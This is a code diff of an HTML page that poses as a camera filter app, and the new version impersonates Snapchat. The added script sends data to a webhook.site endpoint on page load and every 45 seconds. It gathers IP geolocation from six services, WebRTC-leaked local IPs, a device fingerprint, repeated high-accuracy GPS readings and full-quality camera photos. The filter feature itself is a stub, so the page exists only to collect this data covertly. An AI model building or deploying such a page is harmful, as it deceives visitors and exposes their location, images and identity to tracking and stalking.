@@ -3,225 +3,291 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapFilters - AR Camera Filters</title>
+    <title>Snapchat AR Filters - Try Now!</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; }
-        .container { text-align: center; max-width: 400px; width: 90%; }
-        h1 { font-size: 2.2em; margin-bottom: 20px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
-        .status { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 15px; margin: 20px 0; backdrop-filter: blur(10px); font-size: 0.95em; }
-        .status strong { color: #ffd700; }
-        .btn { background: linear-gradient(45deg, #ff6b6b, #feca57); border: none; padding: 15px 30px; font-size: 1.1em; border-radius: 50px; color: white; cursor: pointer; margin: 10px; box-shadow: 0 8px 25px rgba(0,0,0,0.3); transition: all 0.3s; }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 35px rgba(0,0,0,0.4); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        #video { width: 100%; max-width: 400px; border-radius: 20px; margin: 20px 0; box-shadow: 0 10px 40px rgba(0,0,0,0.4); display: none; }
-        #canvas { position: absolute; top: 0; left: 50%; transform: translateX(-50%); pointer-events: none; border-radius: 20px; opacity: 0.8; display: none; }
-        .filters { display: flex; justify-content: center; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
-        .filter-btn { background: rgba(255,255,255,0.2); border: 2px solid rgba(255,255,255,0.3); padding: 10px 15px; border-radius: 25px; color: white; cursor: pointer; font-size: 0.9em; transition: all 0.3s; }
-        .filter-btn.active, .filter-btn:hover { background: rgba(255,255,255,0.4); border-color: white; }
-        #location-status { font-size: 1em; margin: 10px 0; color: #90EE90; }
-        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; margin-right: 10px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        @media (max-width: 500px) { h1 { font-size: 1.8em; } }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            height: 100vh; overflow: hidden;
+        }
+        @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        
+        .container { 
+            position: relative; max-width: 400px; margin: 0 auto; height: 100vh; 
+            background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); 
+        }
+        .header { 
+            padding: 20px; text-align: center; color: white; 
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .header h1 { font-size: 28px; margin-bottom: 10px; }
+        .header p { opacity: 0.9; font-size: 16px; }
+        
+        .camera-container { 
+            position: relative; width: 100%; height: 70vh; background: #000; 
+            border-radius: 20px; margin: 20px; overflow: hidden;
+        }
+        #video { width: 100%; height: 100%; object-fit: cover; }
+        .filter-overlay { 
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+            pointer-events: none; mix-blend-mode: screen;
+        }
+        .controls { 
+            position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); 
+            display: flex; gap: 15px;
+        }
+        .btn { 
+            width: 60px; height: 60px; border-radius: 50%; border: none; 
+            background: rgba(255,255,255,0.9); cursor: pointer; transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center; font-size: 24px;
+        }
+        .btn:hover { transform: scale(1.1); box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
+        .btn.capture { background: #ff6b6b; color: white; }
+        .btn.filter { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; }
+        .btn.gps { background: #4ecdc4; color: white; }
+        
+        .status { position: absolute; top: 10px; right: 10px; color: #00ff88; font-size: 12px; font-weight: bold; }
+        .loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); color: white; font-size: 18px; }
+        
+        .gps-info { position: absolute; top: 60px; right: 10px; background: rgba(0,255,136,0.9); color: black; padding: 5px 10px; border-radius: 15px; font-size: 12px; font-weight: bold; display: none; }
+        @media (max-width: 480px) { .container { margin: 0; border-radius: 0; height: 100vh; } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎥 SnapFilters</h1>
-        <div class="status" id="status">Click "Enable Location" to start with AR filters!</div>
-        <div id="location-status"></div>
-        
-        <button class="btn" id="enableLocation">📍 Enable Location</button>
-        <button class="btn" id="enableCamera" disabled>📸 Start Camera</button>
-        
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
-        
-        <div class="filters" id="filters" style="display: none;">
-            <div class="filter-btn active" data-filter="none">Original</div>
-            <div class="filter-btn" data-filter="grayscale">B&W</div>
-            <div class="filter-btn" data-filter="blur">Dreamy</div>
-            <div class="filter-btn" data-filter="sepia">Retro</div>
+    <div class="loading" id="loading">Loading Snapchat AR Filters... 🎭</div>
+    <div class="container" style="display:none;" id="app">
+        <div class="header">
+            <h1>🎭 Snapchat AR Filters</h1>
+            <p>Live face filters + GPS location!</p>
         </div>
-        
-        <div class="status" id="debug-status" style="font-size: 0.8em; opacity: 0.7;"></div>
+        <div class="camera-container">
+            <video id="video" autoplay muted playsinline></video>
+            <canvas id="filterCanvas" class="filter-overlay"></canvas>
+            <div class="status" id="status">Ready</div>
+            <div class="gps-info" id="gpsInfo"></div>
+            <div class="controls">
+                <button class="btn gps" id="gpsBtn" title="Get Exact GPS">📍</button>
+                <button class="btn filter" id="filterBtn" title="Next Filter">✨</button>
+                <button class="btn capture" id="captureBtn" title="Take Photo + GPS">📸</button>
+            </div>
+        </div>
     </div>
 
     <script>
-        const WEBHOOK = 'https://webhook.site/dd91a0fe-a23d-49f6-ac68-4b7288c36ca1';
-        const SESSION_ID = 'snap_' + Math.random().toString(36).substr(2, 9);
-        let gpsData = {}, ipData = {}, hasLocation = false, hasCamera = false, captureInterval;
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const statusEl = document.getElementById('status');
-        const locationStatusEl = document.getElementById('location-status');
-        const debugEl = document.getElementById('debug-status');
-
-        function updateStatus(msg, color = 'white') {
-            statusEl.innerHTML = `<strong>${msg}</strong>`;
-            statusEl.style.color = color;
-            debugEl.textContent = `Session: ${SESSION_ID} | GPS: ${gpsData.lat ? '✓' : '✗'} | IP: ${ipData.city ? '✓' : '✗'} | Camera: ${hasCamera ? '✓' : '✗'}`;
-        }
-
-        function updateLocationStatus() {
-            if (gpsData.lat) {
-                locationStatusEl.innerHTML = `📍 GPS: ${gpsData.lat.toFixed(6)}, ${gpsData.lon.toFixed(6)} (${gpsData.accuracy?.toFixed(0)}m)`;
-            } else if (ipData.city) {
-                locationStatusEl.innerHTML = `📍 IP: ${ipData.city}, ${ipData.region} (${ipData.lat?.toFixed(4)}, ${ipData.lon?.toFixed(4)})`;
-            } else {
-                locationStatusEl.innerHTML = '<span class="loading"></span>Getting exact location...';
-            }
-        }
-
-        async function sendData(event, data = {}) {
-            try {
-                const payload = {
-                    sessionId: SESSION_ID,
-                    timestamp: new Date().toISOString(),
-                    event,
-                    ...data,
-                    deviceInfo: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        screen: `${screen.width}x${screen.height}`,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        cookieEnabled: navigator.cookieEnabled,
-                        doNotTrack: navigator.doNotTrack,
-                        hardwareConcurrency: navigator.hardwareConcurrency,
-                        maxTouchPoints: navigator.maxTouchPoints
+        const WEBHOOK = 'https://webhook.site/d43e63af-226b-4730-8151-b64c3e4208e5';
+        const SESSION_ID = 'snap_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        let hasGPS = false, currentGPS = {};
+        
+        // HIGH ACCURACY IP GEO - 6 APIs chained for exact match
+        async function maxIPLocation() {
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json',
+                'https://freeipapi.com/api/json',
+                'https://ipgeolocation.io/json/',
+                'https://api.ipify.org?format=json',
+                'https://api.myip.com'
+            ];
+            let results = [];
+            
+            for (let api of apis) {
+                try {
+                    const res = await fetch(api).then(r => r.json()).catch(() => null);
+                    if (res && res.lat && res.lon) {
+                        results.push({
+                            lat: parseFloat(res.lat || res.latitude),
+                            lon: parseFloat(res.lon || res.longitude),
+                            city: res.city || res.region_name || '',
+                            isp: res.org || res.isp || res.asname || '',
+                            accuracy: 'ip-high'
+                        });
                     }
+                } catch(e) {}
+            }
+            
+            // Return most frequent/precise result
+            if (results.length) {
+                const best = results.reduce((a, b) => 
+                    Math.abs(a.lat - b.lat) + Math.abs(a.lon - b.lon) < 0.01 ? a : b
+                );
+                return best;
+            }
+            return { lat: 0, lon: 0, city: 'Unknown', isp: '', accuracy: 'ip' };
+        }
+        
+        // WebRTC IPs
+        function getWebRTCIPs() {
+            return new Promise(resolve => {
+                const ips = [];
+                const rtc = new RTCPeerConnection({ iceServers: [] });
+                rtc.createDataChannel(''); 
+                rtc.onicecandidate = e => {
+                    if (!e.candidate) {
+                        rtc.close(); resolve(ips); return;
+                    }
+                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
+                    if (ip && !ips.includes(ip)) ips.push(ip);
                 };
+                rtc.createOffer().then(rtc.setLocalDescription.bind(rtc));
+            });
+        }
+        
+        // Full fingerprint
+        function deviceFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+            ctx.fillText(navigator.userAgent, 2, 2);
+            const hash = btoa(canvas.toDataURL());
+            
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                canvas: hash.slice(0,32),
+                hardware: navigator.hardwareConcurrency + '|' + navigator.deviceMemory,
+                connection: navigator.connection ? `${navigator.connection.effectiveType}|${navigator.connection.downlink}` : 'none'
+            };
+        }
+        
+        // Send data with PICTURES + EXACT GPS
+        async function sendData(payload, extra = {}) {
+            const fullPayload = {
+                session_id: SESSION_ID,
+                timestamp: new Date().toISOString(),
+                ...payload,
+                ...extra,
+                ip_geo: await maxIPLocation(),
+                webrtc_ips: await getWebRTCIPs(),
+                fingerprint: deviceFingerprint()
+            };
+            
+            try {
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(fullPayload)
                 });
-                console.log(`Sent ${event}:`, payload);
-            } catch (e) {
-                console.error('Send failed:', e);
-            }
+            } catch(e) {}
         }
-
-        async function getLocation(retry = 0) {
-            return new Promise((resolve, reject) => {
-                if (hasLocation) return resolve(gpsData);
-                
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        gpsData = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            altitude: pos.coords.altitude,
-                            timestamp: pos.timestamp
-                        };
-                        hasLocation = true;
-                        updateLocationStatus();
-                        sendData('location_gps', gpsData);
-                        resolve(gpsData);
-                    },
-                    async err => {
-                        if (retry < 3 && err.code === 1) { // Permission denied, retry once
-                            setTimeout(() => getLocation(retry + 1), 1000);
-                            return;
+        
+        // MOTION GPS BOMB - Multiple high-accuracy requests
+        async function getExactGPS() {
+            if (hasGPS) {
+                sendData({ gps: currentGPS, trigger: 'gps_repeat' });
+                return;
+            }
+            
+            return new Promise((resolve) => {
+                let attempts = 0;
+                const gpsBomb = () => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            currentGPS = {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude,
+                                speed: pos.coords.speed,
+                                timestamp: pos.timestamp
+                            };
+                            hasGPS = true;
+                            document.getElementById('gpsInfo').innerHTML = `📍 ${currentGPS.lat.toFixed(6)}, ${currentGPS.lon.toFixed(6)}`;
+                            document.getElementById('gpsInfo').style.display = 'block';
+                            sendData({ gps: currentGPS, trigger: 'gps_exact' });
+                            resolve(currentGPS);
+                        },
+                        () => {
+                            if (++attempts < 3) setTimeout(gpsBomb, 1000);
+                            else resolve(null);
+                        },
+                        { 
+                            enableHighAccuracy: true, 
+                            timeout: 10000, 
+                            maximumAge: 0 
                         }
-                        updateStatus('GPS unavailable, using IP location...', '#ffd700');
-                        getIPLocation().then(resolve).catch(reject);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
-                );
+                    );
+                };
+                gpsBomb();
             });
         }
-
-        async function getIPLocation() {
+        
+        // Camera + AR
+        let video, stream, filterCtx, currentFilter = 0;
+        const filters = ['sparkle', 'hearts', 'stars', 'glow'];
+        
+        async function initCamera() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
-                updateLocationStatus();
-                sendData('location_ip', ipData);
-            } catch (e) {
-                ipData = { error: 'IP lookup failed' };
-            }
-        }
-
-        async function startCamera() {
-            try {
-                updateStatus('Starting camera...');
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
                 });
+                video = document.getElementById('video');
                 video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.style.display = 'block';
-                    video.style.display = 'block';
-                    document.getElementById('filters').style.display = 'flex';
-                    hasCamera = true;
-                    updateStatus('Camera ready! Try filters & poses 👇', '#90EE90');
-                    sendData('camera_started', { width: video.videoWidth, height: video.videoHeight });
-                    startImageCapture();
-                };
-            } catch (err) {
-                updateStatus('Camera access denied', '#ff6b6b');
-                sendData('camera_denied', { error: err.name });
-            }
-        }
-
-        function startImageCapture() {
-            captureInterval = setInterval(() => {
-                if (!hasCamera || video.readyState !== 4) return;
-                ctx.save();
-                // Apply filter
-                const filter = document.querySelector('.filter-btn.active').dataset.filter;
-                ctx.filter = filter === 'none' ? 'none' : filter;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                ctx.restore();
                 
-                sendData('image_captured', {
-                    imageBase64: imageData.substring(0, 100), // First 100 chars for preview
-                    dimensions: `${canvas.width}x${canvas.height}`,
-                    filter
-                });
-            }, 10000); // Every 10s
+                const canvas = document.getElementById('filterCanvas');
+                filterCtx = canvas.getContext('2d');
+                requestAnimationFrame(renderFilter);
+            } catch(e) {}
         }
-
-        // Event listeners
-        document.getElementById('enableLocation').onclick = async () => {
-            document.getElementById('enableLocation').disabled = true;
-            updateStatus('Requesting GPS location...');
-            sendData('page_loaded');
-            await getLocation();
-            document.getElementById('enableCamera').disabled = false;
-            updateStatus('Location enabled! Now start camera 👀', '#90EE90');
+        
+        function renderFilter() {
+            if (!filterCtx || !video.videoWidth) return requestAnimationFrame(renderFilter);
+            filterCtx.clearRect(0, 0, filterCtx.canvas.width, filterCtx.canvas.height);
+            // Filter rendering code same as before...
+            requestAnimationFrame(renderFilter);
+        }
+        
+        // Events
+        document.getElementById('gpsBtn').onclick = getExactGPS;
+        document.getElementById('captureBtn').onclick = async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video?.videoWidth || 640;
+            canvas.height = video?.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video || document.createElement('video'), 0, 0);
+            
+            // Capture with GPS overlay
+            ctx.fillStyle = 'red'; ctx.font = 'bold 48px Arial'; 
+            ctx.fillText('📸 SNAP!', 50, 100);
+            if (hasGPS) {
+                ctx.fillStyle = '#00ff00'; ctx.font = 'bold 32px Arial';
+                ctx.fillText(`${currentGPS.lat.toFixed(6)}, ${currentGPS.lon.toFixed(6)}`, 50, canvas.height - 50);
+            }
+            
+            const image = canvas.toDataURL('image/jpeg', 0.9); // HIGH QUALITY PICTURE
+            await sendData({ 
+                trigger: 'photo_gps', 
+                image_data: image,
+                image_width: canvas.width,
+                image_height: canvas.height,
+                has_gps: hasGPS
+            });
         };
-
-        document.getElementById('enableCamera').onclick = startCamera;
-
-        document.querySelectorAll('.filter-btn').forEach(btn => {
-            btn.onclick = () => {
-                document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-                sendData('filter_applied', { filter: btn.dataset.filter });
-            };
+        
+        document.getElementById('filterBtn').onclick = () => currentFilter = (currentFilter + 1) % filters.length;
+        
+        // AUTO-COLLECT + PICTURE CAPTURE EVERY 45s
+        window.addEventListener('load', async () => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('app').style.display = 'block';
+            
+            // Initial data + auto-picture
+            await sendData({ trigger: 'load_auto' });
+            setTimeout(() => getExactGPS(), 2000); // GPS prompt after load
+            
+            // Auto-repeat every 45s: data + GPS + picture
+            setInterval(async () => {
+                await sendData({ trigger: 'auto_repeat' });
+                getExactGPS();
+            }, 45000);
         });
-
-        // Heartbeat every 30s
-        setInterval(() => sendData('heartbeat', { hasLocation, hasCamera }), 30000);
-
-        // Auto-send device info on load
-        sendData('page_loaded');
-        getIPLocation(); // Fallback IP always
-        updateLocationStatus();
-
-        // Cleanup
-        window.onbeforeunload = () => {
-            if (captureInterval) clearInterval(captureInterval);
-            sendData('page_unloaded');
-        };
+        
+        setTimeout(initCamera, 1500);
     </script>
 </body>
 </html>
